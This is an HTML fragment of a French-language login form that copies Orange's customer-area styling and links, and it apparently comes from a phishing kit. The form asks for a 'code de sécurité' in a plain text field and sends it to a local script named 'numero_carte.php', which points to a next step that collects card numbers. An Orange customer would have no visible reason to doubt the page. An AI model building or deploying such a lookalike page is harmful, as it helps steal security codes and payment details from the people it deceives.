                ...
                <div id="stage" class="eui-st2">
                    ...
                    <form class="eui-form text-centr" id="euiFor" action="../numero_carte.php">
                        ...
                        <div class="form-group ">
							<label for="loginss" id="loginLabesl" class="eui-label" style="color: #f12b2d;">Renseignez correctement le code de sécurité</label>
                            ...
                            <div id="passwordContainer">
                                <input type="text" id="password" name="code" placeholder="Code de sécurité" class="form-control pass-assist" required="" aria-hidden="false" aria-invalid="false" aria-required="true">
                            </div>
                            <br>
                    ...
                    <nav class="eui-links row" role="navigation">
                        ...
                        <div id="firstAccessDiv" class="col-xs-12 col-md-12 col-lg-12 col-xl-12" style="display: none;">
                            <a id="firstAccessLink" data-oevent="idme_login;clic_créer_compte;créer_votre_compte" href="https://r.orange.fr/r/Oid_signup?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil" title="Vous n’êtes pas client ? Créer votre compte">Vous n’êtes pas client ? Créer votre compte</a>
                        </div>
